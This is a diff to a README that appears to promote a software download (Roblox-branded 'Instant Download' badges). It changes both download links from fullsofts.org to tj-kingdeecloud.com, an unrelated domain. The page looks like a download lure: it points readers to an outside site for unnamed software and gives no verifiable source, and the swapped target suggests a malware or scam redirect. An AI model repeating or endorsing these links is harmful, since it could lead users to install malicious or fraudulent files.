@@ -6,7 +6,7 @@
 
 ## 📥 Instant Download
 
-[![Download Now](https://img.shields.io/badge/Download-FullSofts.org-orange?style=for-the-badge&logo=roblox)](https://fullsofts.org/)
+[![Download Now](https://img.shields.io/badge/Download-FullSofts.org-orange?style=for-the-badge&logo=roblox)](https://tj-kingdeecloud.com/)
 
 ---
 
@@ -93,6 +93,6 @@ Upon extraction, preserve the complete directory structure for optimal functiona
 
 ---
 
-[![Download Primary Package](https://img.shields.io/badge/Obtain_Software-Click_Here-yellowgreen?style=for-the-badge)](https://fullsofts.org/)
+[![Download Primary Package](https://img.shields.io/badge/Obtain_Software-Click_Here-yellowgreen?style=for-the-badge)](https://tj-kingdeecloud.com/)
 
 *Access the distribution portal above to begin implementation.*
